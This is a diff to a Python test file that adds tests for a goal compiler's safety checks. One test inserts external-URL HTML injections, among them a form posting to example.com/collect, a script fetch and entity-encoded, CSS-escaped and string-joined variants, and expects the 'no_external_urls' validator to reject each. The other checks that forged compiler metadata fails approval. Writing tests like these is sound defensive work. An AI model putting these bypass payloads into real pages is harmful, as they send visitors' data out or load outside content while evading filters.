@@ -344,6 +344,43 @@ class GoalCompilerBoundaryTests(unittest.TestCase):
         errors = "\n".join(goal_compiler.validate_contract(contract, require_human_approval=False))
         self.assertIn("validator `no_external_urls` failed", errors)
 
+    def test_html_external_url_gate_rejects_network_capable_bypasses(self) -> None:
+        variants = {
+            "form action": '<form action="https://example.com/collect"></form>',
+            "srcset": '<img srcset="https://example.com/a.png 1x, //example.org/b.png 2x" alt="external">',
+            "css import": '<style>@import url(https://example.com/theme.css);</style>',
+            "script fetch": '<script>fetch("https://example.com/collect")</script>',
+            "encoded URL": '<form action="https:&#47;&#47;example.com/collect"></form>',
+            "CSS escaped URL": '<style>@import url(https:\\2f\\2f example.com/theme.css);</style>',
+            "computed script": '<script>fetch(["https:", "//example.com"].join(""))</script>',
+        }
+        for name, injection in variants.items():
+            with self.subTest(vector=name):
+                semantic = goal_compiler.load_semantic_input(DEMO_FIXTURES / "semantic-input.demo.json")
+                content = semantic["first_step"]["content_template"].replace("</main>", f"{injection}</main>")
+                set_first_step_content(semantic, content)
+                contract = compile_semantic(semantic, request=WEBSITE_REQUEST)
+                errors = "\n".join(goal_compiler.validate_contract(contract, require_human_approval=False))
+                self.assertIn("validator `no_external_urls` failed", errors)
+
+    def test_compiler_metadata_is_exact_and_approval_bound(self) -> None:
+        semantic = load_semantic("coding-semantic-input.json")
+        approved = goal_compiler.apply_human_review(
+            compile_semantic(semantic),
+            synthetic_review("csv-empty-line-regression"),
+        )
+        forged = copy.deepcopy(approved)
+        forged["compiler"] = {
+            "name": "Forged Compiler",
+            "version": "999.0",
+            "kind": "cryptographically-signed-runtime",
+        }
+        errors = goal_compiler.validate_contract(forged)
+        self.assertTrue(any(error.startswith("compiler:") for error in errors), errors)
+        self.assertTrue(any("approved_payload_sha256" in error for error in errors), errors)
+        with self.assertRaises(goal_compiler.CompilerError):
+            goal_compiler.execute_first_step(forged)
+
     def test_request_hash_and_contract_id_are_verified(self) -> None:
         semantic = load_semantic("coding-semantic-input.json")
         contract = compile_semantic(semantic)
